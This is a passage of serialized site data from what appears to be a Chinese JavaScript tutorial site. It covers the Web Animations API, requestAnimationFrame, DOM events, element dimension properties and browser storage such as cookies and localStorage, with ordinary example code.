api",charIndex:70},{level:3,title:"设置动画",slug:"设置动画",normalizedTitle:"设置动画",charIndex:149},{level:3,title:"动画播放控制",slug:"动画播放控制",normalizedTitle:"动画播放控制",charIndex:2377},{level:3,title:"动画事件",slug:"动画事件",normalizedTitle:"动画事件",charIndex:3072},{level:2,title:"原生js动画",slug:"原生js动画",normalizedTitle:"原生js动画",charIndex:3183},{level:3,title:"window.requestAnimationFrame",slug:"window-requestanimationframe",normalizedTitle:"window.requestanimationframe",charIndex:4705}],headersStr:"Web Animations API 设置动画 动画播放控制 动画事件 原生js动画 window.requestAnimationFrame",content:"# JavaScript动画\n\n网页动画实现方式：\n\n 1. CSS3: 过渡transition 、 帧动画@keyframes\n 2. Web Animations API\n 3. JQuery的animate函数\n 4. 引用gif图片\n\n\n# Web Animations API\n\n\n# 设置动画\n\nweb Animations API可以让我们用JavaScript写动画并且控制动画。\n\n语法：\n\nelement.animate(keyframes, timing)\n\n\n参数：\n\n * keyframes: 关键帧对象数组，代表原始css的每个帧\n * timing: 动画时间属性对象，规定运动时间、运动方式等属性\n\n以此css3动画为例，使用animate api来实现：\n\ndiv{\n    animation: turn 3s linear infinite ;\n}\n@keyframes turn {\n    0%{\n        background-color: #000;\n        transform: rotate(0);\n    }\n    100%{\n        background-color: #ccc;\n        transform: rotate(360deg);\n    }\n}\n\n\n# 参数1: keyframes\n\nvar keyframes = [\n  { backgroundColor: '#000', transform: 'rotate(0)', offset:0},\n  { backgroundColor: '#ccc', transform: 'rotate(360deg)', offset:1},\n];\n\n\nkeyframes参数使用一个包含多个对象的数组，每个对象代表原始CSS中的一个帧。\n\n与CSS不同的是，Web动画API不需要指定每个帧出现的时间百分比，会根据给出帧的个数自动进行时间等分。 如果需要设置某一个帧的时间时，可以使用offset属性，在30%的时间点则写offset: 0.3。\n\n必须至少指定两个关键帧（表示动画序列的开始和结束状态），否则会报错。\n\n# 参数2: timing\n\nvar timing = {\n  duration: 3000,\n  iterations: Infinity,\n}\n\n\n运动方式配置：\n\n属性           值                                    说明\nduration     ms                                   一次动画持续的毫秒时间，只支持毫秒，不写单位\niterations   number                               动画次数. Infinity表示无数次。默认值 1\ndelay        number                               动画延迟时间，以ms计,不写单位。 默认值 0\ndirection    normal / reverse                     动画运动方向，reverse反向，alternate一次运动结束后逆向播放。 默认值 normal\n             alternate / alternate-reverse\neasing       cubic-bezier                         动画运动方式，\"linear\"，\"ease\"，\"ease-in\"，\"ease-out\"，和\"ease-in-out\"等。\n                                                  默认值 'linear'\nfill         none / backwards / forwards / both   保留动画状态，backwards保留播放前状态，forwards保留播放结束状态，both全部保留。 默认值\n                                                  'none'\ndelay        number                               动画延迟时间，以ms计,不写单位, 默认值 0\n\n动画参数整合：\n\nvar keyframes = [\n  { backgroundColor: '#000', transform: 'rotate(0)', offset:0},\n  { backgroundColor: '#ccc', transform: 'rotate(360deg)', offset:1},\n]\nvar timing = {\n  duration: 3000,\n  iterations: Infinity,\n}\n\nvar div = document.querySelector(\"div\");\ndiv.animate(keyframes, timing);\n\n\n如果只需要指定动画的持续时间，可以单独传递毫秒:\n\nvar div = document.querySelector(\"div\");\ndiv.animate([\n  { backgroundColor: '#000', transform: 'rotate(0)', offset:0},\n  { backgroundColor: '#ccc', transform: 'rotate(360deg)', offset:1},\n], 3000);\n\n\n\n# 动画播放控制\n\nElement.animate()方法执行会会返回一个动画对象，动画对象中还提供了一些控制播放的有用方法：\n\n属性             功能\nplaybackRate   动画播放速度。取一个可以是0、负数或正数的数字。负值反转动画。该值是缩放因子，因此例如值2将使播放速度加倍\n\n方法          功能\npause()     动画暂停\nplay()      动画播放\nreverse()   播放方向。如果在未播放的动画上调用，则向后播放整个动画。如果在暂停的动画上调用，则动画将反向继续\nfinish()    立即完成动画\ncancel()    立即关闭动画\n\nElement.animate() 方法会在调用后立即执行进行运动，为了在启动运动时加一写限制(例如点击开始运动),可以调用Animation.pause()，点击事件中调用Animation.play()：\n\nvar div = document.querySelector(\"div\");\nvar turn = div.animate([\n  { backgroundColor: '#000', transform: 'rotate(0)', offset:0},\n  { backgroundColor: '#ccc', transform: 'rotate(360deg)', offset:1},\n], 3000);\nturn.pause();  \n// 动画默认暂停，点击后开始运动\ndiv.onclick = function(){ turn.play() }\n\n\n\n\n# 动画事件\n\n事件名        功能\nonfinish   动画播放完成后触发该事件 （播放完成或通过finish()完成动画）\noncancel   动画被关闭时触发该事件 （通过cancel()可关闭动画）\n\n\n# 原生js动画\n\n由于Web Animations API兼容性较差，所以在设置JavaScript动画时会使用插件或使用原生js封装动画：\n\nfunction linear(t, b, c, d) {\n    return c / d * t + b\n}\n\nfunction animate(element, target, duration, callback) {\n    let change = {};\n    let begin = {};\n    for (let key in target) {\n        begin[key] = getCss(element, key);\n        change[key] = removeUnit(target[key]) - begin[key];\n    }\n\n    let time = 0;\n    let timing = setInterval(() => {\n        time += 20;\n      if (time >= duration) {\n          clearInterval(timing);\n          for (let key in target) {\n              setCss(element, key, target[key]);\n          }\n          callback && callback.call(element);\n          return;\n      }\n      for (let key in target) {\n          let current = linear(time, begin[key], change[key], duration);\n          setCss(element, key, current);\n      }\n  }, 20)\n}\n\nfunction getCss(ele, attr) {\n    let value = window.getComputedStyle(ele)[attr];\n    return removeUnit(value);\n}\n\nfunction removeUnit(value) {\n    let reg = /^[-+]?([1-9]\\d+|\\d)(\\.\\d+)?(px|pt|em|rem)$/;\n    if (isNaN(value) && reg.test(value)) return parseFloat(value);\n    if (isNaN(value)) return Number(value);\n    return value\n}\n\nfunction setCss(ele, attr, val) {\n    let reg = /^(width|height|top|bottom|left|right|(margin|padding)(Top|Left|Bottom|Right)?)$/;\n    if (!isNaN(val) && reg.test(attr)) {\n        ele.style[attr] = val + \"px\";\n        return;\n    }\n    ele.style[attr] = val;\n}\n\n\n使用：\n\nlet box = document.querySelector(\"#box\");\nanimates(box, {left: 500}, 3000);\n\n\n\n# window.requestAnimationFrame\n\nwindow.requestAnimationFrame()告诉浏览器——你希望执行一个动画，并且要求浏览器在下次重绘之前调用指定的回调函数更新动画。该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行\n\nvar rid = window.requestAnimationFrame(callback);\n\n\n# 参数\n\ncallback 下一次重绘之前更新动画帧所调用的函数(即上面所说的回调函数)。\n\n# 返回值\n\n一个 long 整数，请求 ID ，是回调列表中唯一的标识。是个非零值，没别的意义。你可以传这个值给 window.cancelAnimationFrame() 以取消回调函数。\n\nwindow.cancelAnimationFrame(rid)\n\n\n动画设置多长时间合适？\n\nwindow.setInterval(function(){},1000/60)\n\nrid = window.requestAnimationFrame(callback)\nwindow.cancelAnimationFrame(rid)\n\nfunction raf(callback){\n    if(\"requestAnimationFrame\" in window){\n        return window.requestAnimationFrame(callback)\n    }else{\n        return setTimeout(callback,1000/60)\n    }\n}\nvar id = raf(callback)\n",normalizedContent:"# javascript动画\n\n网页动画实现方式：\n\n 1. css3: 过渡transition 、 帧动画@keyframes\n 2. web animations api\n 3. jquery的animate函数\n 4. 引用gif图片\n\n\n# web animations api\n\n\n# 设置动画\n\nweb animations api可以让我们用javascript写动画并且控制动画。\n\n语法：\n\nelement.animate(keyframes, timing)\n\n\n参数：\n\n * keyframes: 关键帧对象数组，代表原始css的每个帧\n * timing: 动画时间属性对象，规定运动时间、运动方式等属性\n\n以此css3动画为例，使用animate api来实现：\n\ndiv{\n    animation: turn 3s linear infinite ;\n}\n@keyframes turn {\n    0%{\n        background-color: #000;\n        transform: rotate(0);\n    }\n    100%{\n        background-color: #ccc;\n        transform: rotate(360deg);\n    }\n}\n\n\n# 参数1: keyframes\n\nvar keyframes = [\n  { backgroundcolor: '#000', transform: 'rotate(0)', offset:0},\n  { backgroundcolor: '#ccc', transform: 'rotate(360deg)', offset:1},\n];\n\n\nkeyframes参数使用一个包含多个对象的数组，每个对象代表原始css中的一个帧。\n\n与css不同的是，web动画api不需要指定每个帧出现的时间百分比，会根据给出帧的个数自动进行时间等分。 如果需要设置某一个帧的时间时，可以使用offset属性，在30%的时间点则写offset: 0.3。\n\n必须至少指定两个关键帧（表示动画序列的开始和结束状态），否则会报错。\n\n# 参数2: timing\n\nvar timing = {\n  duration: 3000,\n  iterations: infinity,\n}\n\n\n运动方式配置：\n\n属性           值                                    说明\nduration     ms                                   一次动画持续的毫秒时间，只支持毫秒，不写单位\niterations   number                               动画次数. infinity表示无数次。默认值 1\ndelay        number                               动画延迟时间，以ms计,不写单位。 默认值 0\ndirection    normal / reverse                     动画运动方向，reverse反向，alternate一次运动结束后逆向播放。 默认值 normal\n             alternate / alternate-reverse\neasing       cubic-bezier                         动画运动方式，\"linear\"，\"ease\"，\"ease-in\"，\"ease-out\"，和\"ease-in-out\"等。\n                                                  默认值 'linear'\nfill         none / backwards / forwards / both   保留动画状态，backwards保留播放前状态，forwards保留播放结束状态，both全部保留。 默认值\n                                                  'none'\ndelay        number                               动画延迟时间，以ms计,不写单位, 默认值 0\n\n动画参数整合：\n\nvar keyframes = [\n  { backgroundcolor: '#000', transform: 'rotate(0)', offset:0},\n  { backgroundcolor: '#ccc', transform: 'rotate(360deg)', offset:1},\n]\nvar timing = {\n  duration: 3000,\n  iterations: infinity,\n}\n\nvar div = document.queryselector(\"div\");\ndiv.animate(keyframes, timing);\n\n\n如果只需要指定动画的持续时间，可以单独传递毫秒:\n\nvar div = document.queryselector(\"div\");\ndiv.animate([\n  { backgroundcolor: '#000', transform: 'rotate(0)', offset:0},\n  { backgroundcolor: '#ccc', transform: 'rotate(360deg)', offset:1},\n], 3000);\n\n\n\n# 动画播放控制\n\nelement.animate()方法执行会会返回一个动画对象，动画对象中还提供了一些控制播放的有用方法：\n\n属性             功能\nplaybackrate   动画播放速度。取一个可以是0、负数或正数的数字。负值反转动画。该值是缩放因子，因此例如值2将使播放速度加倍\n\n方法          功能\npause()     动画暂停\nplay()      动画播放\nreverse()   播放方向。如果在未播放的动画上调用，则向后播放整个动画。如果在暂停的动画上调用，则动画将反向继续\nfinish()    立即完成动画\ncancel()    立即关闭动画\n\nelement.animate() 方法会在调用后立即执行进行运动，为了在启动运动时加一写限制(例如点击开始运动),可以调用animation.pause()，点击事件中调用animation.play()：\n\nvar div = document.queryselector(\"div\");\nvar turn = div.animate([\n  { backgroundcolor: '#000', transform: 'rotate(0)', offset:0},\n  { backgroundcolor: '#ccc', transform: 'rotate(360deg)', offset:1},\n], 3000);\nturn.pause();  \n// 动画默认暂停，点击后开始运动\ndiv.onclick = function(){ turn.play() }\n\n\n\n\n# 动画事件\n\n事件名        功能\nonfinish   动画播放完成后触发该事件 （播放完成或通过finish()完成动画）\noncancel   动画被关闭时触发该事件 （通过cancel()可关闭动画）\n\n\n# 原生js动画\n\n由于web animations api兼容性较差，所以在设置javascript动画时会使用插件或使用原生js封装动画：\n\nfunction linear(t, b, c, d) {\n    return c / d * t + b\n}\n\nfunction animate(element, target, duration, callback) {\n    let change = {};\n    let begin = {};\n    for (let key in target) {\n        begin[key] = getcss(element, key);\n        change[key] = removeunit(target[key]) - begin[key];\n    }\n\n    let time = 0;\n    let timing = setinterval(() => {\n        time += 20;\n      if (time >= duration) {\n          clearinterval(timing);\n          for (let key in target) {\n              setcss(element, key, target[key]);\n          }\n          callback && callback.call(element);\n          return;\n      }\n      for (let key in target) {\n          let current = linear(time, begin[key], change[key], duration);\n          setcss(element, key, current);\n      }\n  }, 20)\n}\n\nfunction getcss(ele, attr) {\n    let value = window.getcomputedstyle(ele)[attr];\n    return removeunit(value);\n}\n\nfunction removeunit(value) {\n    let reg = /^[-+]?([1-9]\\d+|\\d)(\\.\\d+)?(px|pt|em|rem)$/;\n    if (isnan(value) && reg.test(value)) return parsefloat(value);\n    if (isnan(value)) return number(value);\n    return value\n}\n\nfunction setcss(ele, attr, val) {\n    let reg = /^(width|height|top|bottom|left|right|(margin|padding)(top|left|bottom|right)?)$/;\n    if (!isnan(val) && reg.test(attr)) {\n        ele.style[attr] = val + \"px\";\n        return;\n    }\n    ele.style[attr] = val;\n}\n\n\n使用：\n\nlet box = document.queryselector(\"#box\");\nanimates(box, {left: 500}, 3000);\n\n\n\n# window.requestanimationframe\n\nwindow.requestanimationframe()告诉浏览器——你希望执行一个动画，并且要求浏览器在下次重绘之前调用指定的回调函数更新动画。该方法需要传入一个回调函数作为参数，该回调函数会在浏览器下一次重绘之前执行\n\nvar rid = window.requestanimationframe(callback);\n\n\n# 参数\n\ncallback 下一次重绘之前更新动画帧所调用的函数(即上面所说的回调函数)。\n\n# 返回值\n\n一个 long 整数，请求 id ，是回调列表中唯一的标识。是个非零值，没别的意义。你可以传这个值给 window.cancelanimationframe() 以取消回调函数。\n\nwindow.cancelanimationframe(rid)\n\n\n动画设置多长时间合适？\n\nwindow.setinterval(function(){},1000/60)\n\nrid = window.requestanimationframe(callback)\nwindow.cancelanimationframe(rid)\n\nfunction raf(callback){\n    if(\"requestanimationframe\" in window){\n        return window.requestanimationframe(callback)\n    }else{\n        return settimeout(callback,1000/60)\n    }\n}\nvar id = raf(callback)\n",charsets:{cjk:!0}},{title:"DOM事件模型（DOM Event Model）",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80.html",relativePath:"Javascript/JavaScriptDOM操作/事件基础.md",key:"v-8a0714ca",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E5%9F%BA%E7%A1%80.html",headers:[{level:2,title:"事件驱动",slug:"事件驱动",normalizedTitle:"事件驱动",charIndex:94},{level:2,title:"事件集合",slug:"事件集合",normalizedTitle:"事件集合",charIndex:690},{level:3,title:"鼠标事件",slug:"鼠标事件",normalizedTitle:"鼠标事件",charIndex:699},{level:3,title:"键盘事件",slug:"键盘事件",normalizedTitle:"键盘事件",charIndex:953},{level:3,title:"表单事件",slug:"表单事件",normalizedTitle:"表单事件",charIndex:1039},{level:3,title:"其他事件",slug:"其他事件",normalizedTitle:"其他事件",charIndex:1184},{level:2,title:"绑定事件的方式",slug:"绑定事件的方式",normalizedTitle:"绑定事件的方式",charIndex:1368},{level:3,title:"标签绑定事件",slug:"标签绑定事件",normalizedTitle:"标签绑定事件",charIndex:1380},{level:3,title:"Document对象来绑定事件",slug:"document对象来绑定事件",normalizedTitle:"document对象来绑定事件",charIndex:1506}],headersStr:"事件驱动 事件集合 鼠标事件 键盘事件 表单事件 其他事件 绑定事件的方式 标签绑定事件 Document对象来绑定事件",content:'# DOM事件模型（DOM Event Model）\n\n> 事件是可以被 JavaScript 侦测到的行为，例如鼠标点击、键盘按键等。js与html的交互就是通过事件来进行的。\n\n\n# 事件驱动\n\n                        事件驱动\n─────────────────────────────────────────────────────────────\n\n   ┌──────────┐       ┌──────────┐       ┌──────────┐\n   │          │       │          │       │          │\n   │  Source  │ ───── │  Event   │ ───── │  Handle  │\n   │          │       │          │       │          │\n   └──────────┘       └──────────┘       └──────────┘\n      事件源               事件            事件处理程序   \n\n     element      .     onclick      =    function(){}\n     window       .     onload       =    function(){}\n\n─────────────────────────────────────────────────────────────\n\n\n\n\n# 事件集合\n\n\n# 鼠标事件\n\n事件              描述\nonclick         点击\nondblclick      双击\nonmousedown     按下\nonmouseup       抬起\nonmousemove     移动\nonmouseover     移入\nonmouseout      移出\nonmouseenter    鼠标指针移动到元素上时触发(不支持冒泡)\nonmouseleave    鼠标指针移出元素上时触发(不支持冒泡)\noncontextmenu   右键\n\n\n# 键盘事件\n\n事件           描述\nonkeydown    按下\nonkeyup      抬起\nonkeypress   按下(只能触发数字字母符号)\n\n\n# 表单事件\n\n事件         描述\nonfocus    获得焦点\nonblur     失去焦点\nonchange   失去焦点并内容改变\nonsubmit   提交事件（form标签事件）\nonreset    重置事件（form标签事件）\noninput    表单输入\n\n\n# 其他事件\n\n事件                 描述\nonscroll           滚动条事件(滚动条位置改变)\nonwheel            鼠标滚轮事件\nonresize           页面尺寸改变\nonload             页面加载完成之后执行该事件\nDOMContentLoaded   页面结构加载完成执行该事件\n\n\n# 绑定事件的方式\n\n\n# 标签绑定事件\n\n<button onclick="click_fn()">click</button>\n<script>\n  function click_fn(){\n    console.log(this);\n  }\n<\/script>\n\n\n\n# Document对象来绑定事件\n\n> 注意：重复监听某一事件，后者会覆盖前者，而不会两者先后触发\n\n<button>click</button>\n<script>\n    var button1 = document.querySelector(\'button\')\n    button1.onclick=function(){\n        console.log("第一个点击事件的方法");\n    }\n    var button2 = document.querySelector(\'button\')\n    button2.onclick=function(){\n        console.log("第二个点击事件的方法");\n    }      //第二个点击事件的方法会覆盖第一个方法,所以点击只会触发第二次的点击事件方法     \n<\/script>\n',normalizedContent:'# dom事件模型（dom event model）\n\n> 事件是可以被 javascript 侦测到的行为，例如鼠标点击、键盘按键等。js与html的交互就是通过事件来进行的。\n\n\n# 事件驱动\n\n                        事件驱动\n─────────────────────────────────────────────────────────────\n\n   ┌──────────┐       ┌──────────┐       ┌──────────┐\n   │          │       │          │       │          │\n   │  source  │ ───── │  event   │ ───── │  handle  │\n   │          │       │          │       │          │\n   └──────────┘       └──────────┘       └──────────┘\n      事件源               事件            事件处理程序   \n\n     element      .     onclick      =    function(){}\n     window       .     onload       =    function(){}\n\n─────────────────────────────────────────────────────────────\n\n\n\n\n# 事件集合\n\n\n# 鼠标事件\n\n事件              描述\nonclick         点击\nondblclick      双击\nonmousedown     按下\nonmouseup       抬起\nonmousemove     移动\nonmouseover     移入\nonmouseout      移出\nonmouseenter    鼠标指针移动到元素上时触发(不支持冒泡)\nonmouseleave    鼠标指针移出元素上时触发(不支持冒泡)\noncontextmenu   右键\n\n\n# 键盘事件\n\n事件           描述\nonkeydown    按下\nonkeyup      抬起\nonkeypress   按下(只能触发数字字母符号)\n\n\n# 表单事件\n\n事件         描述\nonfocus    获得焦点\nonblur     失去焦点\nonchange   失去焦点并内容改变\nonsubmit   提交事件（form标签事件）\nonreset    重置事件（form标签事件）\noninput    表单输入\n\n\n# 其他事件\n\n事件                 描述\nonscroll           滚动条事件(滚动条位置改变)\nonwheel            鼠标滚轮事件\nonresize           页面尺寸改变\nonload             页面加载完成之后执行该事件\ndomcontentloaded   页面结构加载完成执行该事件\n\n\n# 绑定事件的方式\n\n\n# 标签绑定事件\n\n<button onclick="click_fn()">click</button>\n<script>\n  function click_fn(){\n    console.log(this);\n  }\n<\/script>\n\n\n\n# document对象来绑定事件\n\n> 注意：重复监听某一事件，后者会覆盖前者，而不会两者先后触发\n\n<button>click</button>\n<script>\n    var button1 = document.queryselector(\'button\')\n    button1.onclick=function(){\n        console.log("第一个点击事件的方法");\n    }\n    var button2 = document.queryselector(\'button\')\n    button2.onclick=function(){\n        console.log("第二个点击事件的方法");\n    }      //第二个点击事件的方法会覆盖第一个方法,所以点击只会触发第二次的点击事件方法     \n<\/script>\n',charsets:{cjk:!0}},{title:"元素尺寸位置",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E5%85%83%E7%B4%A0%E5%B0%BA%E5%AF%B8%E4%BD%8D%E7%BD%AE.html",relativePath:"Javascript/JavaScriptDOM操作/元素尺寸位置.md",key:"v-780664cb",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E5%85%83%E7%B4%A0%E5%B0%BA%E5%AF%B8%E4%BD%8D%E7%BD%AE.html",headers:[{level:2,title:"元素的偏移量",slug:"元素的偏移量",normalizedTitle:"元素的偏移量",charIndex:13},{level:3,title:"元素的大小以及相对视口的位置",slug:"元素的大小以及相对视口的位置",normalizedTitle:"元素的大小以及相对视口的位置",charIndex:308},{level:2,title:"滚动条元素的位置",slug:"滚动条元素的位置",normalizedTitle:"滚动条元素的位置",charIndex:712},{level:2,title:"元素的内尺寸",slug:"元素的内尺寸",normalizedTitle:"元素的内尺寸",charIndex:855},{level:3,title:"页面的实际大小",slug:"页面的实际大小",normalizedTitle:"页面的实际大小",charIndex:1017},{level:3,title:"窗口左上角 与 屏幕左上角的 距离",slug:"窗口左上角-与-屏幕左上角的-距离",normalizedTitle:"窗口左上角 与 屏幕左上角的 距离",charIndex:1108},{level:3,title:"屏幕宽高",slug:"屏幕宽高",normalizedTitle:"屏幕宽高",charIndex:1162},{level:3,title:"屏幕可用宽高（去除任务栏）",slug:"屏幕可用宽高-去除任务栏",normalizedTitle:"屏幕可用宽高（去除任务栏）",charIndex:1214},{level:3,title:"窗口的内高度、内宽度（文档显示区域+滚动条）",slug:"窗口的内高度、内宽度-文档显示区域-滚动条",normalizedTitle:"窗口的内高度、内宽度（文档显示区域+滚动条）",charIndex:1285},{level:3,title:"窗口的外高度、外宽度",slug:"窗口的外高度、外宽度",normalizedTitle:"窗口的外高度、外宽度",charIndex:1351}],headersStr:"元素的偏移量 元素的大小以及相对视口的位置 滚动条元素的位置 元素的内尺寸 页面的实际大小 窗口左上角 与 屏幕左上角的 距离 屏幕宽高 屏幕可用宽高（去除任务栏） 窗口的内高度、内宽度（文档显示区域+滚动条） 窗口的外高度、外宽度",content:"# 元素尺寸位置\n\n\n# 元素的偏移量\n\n属性             描述\noffsetWidth    获取元素实际宽度 元素内容(content)+内边距(padding)+边框(border)(不包括外边距)\noffsetHeight   获取元素实际高度\noffsetLeft     表示该元素的左上角距离最近的具有定位属性的祖先元素的左上角的水平距离。\noffsetTop      表示该元素的左上角距离最近的具有定位属性的祖先元素的左上角的垂直距离。\noffsetParent   表示距离该元素最近的具有定位属性的祖先元素。\n\n> 注意：以上均为只读属性，不能修改，返回的是一个数字\n\n\n\n\n# 元素的大小以及相对视口的位置\n\nvar object = element.getBoundingClientRect()   \n\n\n返回一个对象：\n\n{\n    bottom: 1793,\n    height: 1795,\n    left: 0,\n    right: 353,\n    top: -2,\n    width: 353,\n    x: 0,\n    y: -2,\n}\n\n\n属性             描述\nx/y            元素的左上角和视口左上角的距离\nwidth/height   边框 + 内边距 + 内容框\ntop            元素的上边界和视口上边界的距离\nleft           元素的左边界和视口左边界的距离\nright          元素的右边界和视口的左边界的距离\nbottom         元素的下边界和视口上边界的距离\n\n\n# 滚动条元素的位置\n\n获取具有滚动条元素的位置属性\n\n属性              描述\n对象.scrollTop    具有滚动条的元素在滚动的时候，他的内部元素超出该元素顶部距离\n对象.scrollLeft   具有滚动条的元素在滚动的时候，他的内部元素超出该元素左边距离\n\n\n# 元素的内尺寸\n\n属性                         描述\nclientWidth/clientHeight   表示元素的内尺寸：元素内容(content)+内边距(padding)\nclientTop/clientLeft       表示元素的上边框和左边框大小：元素内容(border)\n\n\n\n\n# 页面的实际大小\n\ndocument.documentElement.scrollWidth\ndocument.documentElement.scrollHeight\n\n\n\n\n\n# 窗口左上角 与 屏幕左上角的 距离\n\nwindow.screenX\nwindow.screenY\n\n\n\n# 屏幕宽高\n\nwindow.screen.width\nwindow.screen.height\n\n\n\n# 屏幕可用宽高（去除任务栏）\n\nwindow.screen.availWidth\nwindow.screen.availHeight\n\n\n\n# 窗口的内高度、内宽度（文档显示区域+滚动条）\n\nwindow.innerWidth\nwindow.innerHeight\n\n\n\n# 窗口的外高度、外宽度\n\nwindow.outerWidth\nwindow.outerHeiht\n",normalizedContent:"# 元素尺寸位置\n\n\n# 元素的偏移量\n\n属性             描述\noffsetwidth    获取元素实际宽度 元素内容(content)+内边距(padding)+边框(border)(不包括外边距)\noffsetheight   获取元素实际高度\noffsetleft     表示该元素的左上角距离最近的具有定位属性的祖先元素的左上角的水平距离。\noffsettop      表示该元素的左上角距离最近的具有定位属性的祖先元素的左上角的垂直距离。\noffsetparent   表示距离该元素最近的具有定位属性的祖先元素。\n\n> 注意：以上均为只读属性，不能修改，返回的是一个数字\n\n\n\n\n# 元素的大小以及相对视口的位置\n\nvar object = element.getboundingclientrect()   \n\n\n返回一个对象：\n\n{\n    bottom: 1793,\n    height: 1795,\n    left: 0,\n    right: 353,\n    top: -2,\n    width: 353,\n    x: 0,\n    y: -2,\n}\n\n\n属性             描述\nx/y            元素的左上角和视口左上角的距离\nwidth/height   边框 + 内边距 + 内容框\ntop            元素的上边界和视口上边界的距离\nleft           元素的左边界和视口左边界的距离\nright          元素的右边界和视口的左边界的距离\nbottom         元素的下边界和视口上边界的距离\n\n\n# 滚动条元素的位置\n\n获取具有滚动条元素的位置属性\n\n属性              描述\n对象.scrolltop    具有滚动条的元素在滚动的时候，他的内部元素超出该元素顶部距离\n对象.scrollleft   具有滚动条的元素在滚动的时候，他的内部元素超出该元素左边距离\n\n\n# 元素的内尺寸\n\n属性                         描述\nclientwidth/clientheight   表示元素的内尺寸：元素内容(content)+内边距(padding)\nclienttop/clientleft       表示元素的上边框和左边框大小：元素内容(border)\n\n\n\n\n# 页面的实际大小\n\ndocument.documentelement.scrollwidth\ndocument.documentelement.scrollheight\n\n\n\n\n\n# 窗口左上角 与 屏幕左上角的 距离\n\nwindow.screenx\nwindow.screeny\n\n\n\n# 屏幕宽高\n\nwindow.screen.width\nwindow.screen.height\n\n\n\n# 屏幕可用宽高（去除任务栏）\n\nwindow.screen.availwidth\nwindow.screen.availheight\n\n\n\n# 窗口的内高度、内宽度（文档显示区域+滚动条）\n\nwindow.innerwidth\nwindow.innerheight\n\n\n\n# 窗口的外高度、外宽度\n\nwindow.outerwidth\nwindow.outerheiht\n",charsets:{cjk:!0}},{title:"本地存储",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8.html",relativePath:"Javascript/JavaScriptDOM操作/本地存储.md",key:"v-6ef494da",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8.html",headers:[{level:2,title:"cookie",slug:"cookie",normalizedTitle:"cookie",charIndex:33},{level:3,title:"特点和应用",slug:"特点和应用",normalizedTitle:"特点和应用",charIndex:328},{level:3,title:"操作cookie",slug:"操作cookie",normalizedTitle:"操作cookie",charIndex:509},{level:2,title:"localstorage",slug:"localstorage",normalizedTitle:"localstorage",charIndex:1013},{level:3,title:"特点和应用",slug:"特点和应用-2",normalizedTitle:"特点和应用",charIndex:328},{level:3,title:"判断浏览器是否支持localstorage",slug:"判断浏览器是否支持localstorage",normalizedTitle:"判断浏览器是否支持localstorage",charIndex:1523},{level:3,title:"操作localstorage",slug:"操作localstorage",normalizedTitle:"操作localstorage",charIndex:1642},{level:2,title:"sessionStroage",slug:"sessionstroage",normalizedTitle:"sessionstroage",charIndex:2169},{level:3,title:"三种存储方式的区别总结",slug:"三种存储方式的区别总结",normalizedTitle:"三种存储方式的区别总结",charIndex:2741},{level:2,title:"课堂练习",slug:"课堂练习",normalizedTitle:"课堂练习",charIndex:3154}],headersStr:"cookie 特点和应用 操作cookie localstorage 特点和应用 判断浏览器是否支持localstorage 操作localstorage sessionStroage 三种存储方式的区别总结 课堂练习",content:'# 本地存储\n\n> JavaScript在客户端的存储主要分为三种cookie、localStorage和sessionStorage\n\nChrome和Safari均有自己的本地存储查看和管理工具，Chrome中位于开发人员工具中的Application选项中。localStorage在Chrome查看如下，利用这个工具可以修改或者删除相应项。\n\n\n# cookie\n\n> Cookie 是由 Web 服务器保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，Web 站点都可以访问 Cookie 信息。每个cookie不能超过 4KB，每个 Web 站点能设置的 Cookie 总数不能超过 20 个\n\n\n# 特点和应用\n\n类别     描述\n存储方式   键值对\n大小     4kb,以20个为上限\n访问     根据域名存储，不同域名的cookie无法访问\n清理机制   IE和Opera 会清理近期最少使用的cookie，Firefox会随机清理cookie。\n缺陷     同域内http请求都会带cookie，浪费带宽\n应用     购物车，登录状态\n\n\n# 操作cookie\n\n> 注意：cookie使用时需要服务器环境\n\n键值对的方式设置：\n\ndocument.cookie = "键=值"\ndocument.cookie = name + \'=\' + value;    //设置cookie\n\n\n// 设置cookie的有效时间\nvar d= new Date();\nd.setHours(d.getHours() + (24 * 30)); //保存一个月\ndocument.cookie = "visited=yes; expires=" + d.toUTCString();\n\n\n// 读取cookie\ndocument.cookie.indexOf("key")      //返回值 -1表示不存在此cookie\n\n\n//删除cookie     原理：通过设置cookie的有效时间来删除cookie\nvar exp = new Date();\nexp.setTime(exp.getTime() - 1);\ndocument.cookie= name + "="+cval+";expires="+exp.toUTCString();\n\n\n\n# localstorage\n\n> H5客户端存储是web存储的一种更为强大的版本，可提供更多的安全性、速度和易用性。在 Web 中可以存储数量巨大的数据。具体的数量则取决于 Web 浏览器，但通常都在 5MB 到10MB 之间，这对于一个 HTML应用程序而言已经足够大。另一个好处是此数据并不会在每次出现服务器请求时都被加载。\n\nlocalStorage 没有时间限制的数据存储，也就是说，localStorage是永远不会过期的，除非主动删除数据。数据可跨越多个窗口，无视当前会话，在同一个域中被共同访问、使用。\n\n\n# 特点和应用\n\n类别     描述\n兼容性    ie8+\n存储内容   只要是能序列化成字符串的内容都可以存储，利用JSON.stringify()；\n存储方式   键值对\n访问权限   根据域名存储，不同域名的本地存储无法访问\n存储大小   5M\n主要应用   常用于ajax请求缓存,需要长期保存的数据\n缺陷     不能跨域共享，所以不要用以存储业务关键信息，更加不要存储安全信息\n       （cookie可以通过window.name解决，但是localstorage不能）\n\n\n# 判断浏览器是否支持localstorage\n\nif (window.localStorage) {\n    console.log(\'浏览器支持\');\n} else {\n    console.log(\'浏览器不支持\');\n}\n\n\n\n# 操作localstorage\n\n方法                                 描述\nlocalStorage.length                获得storage中的个数\nlocalStorage .key(n)               获得storage中第n个键值对的键\nlocalStorage.key = value           添加\nlocalStorage.setItem(key, value)   添加\nlocalStorage.getItem(key)          获取\nlocalStorage.removeItem(key)       移除\nlocalStorage.clear()               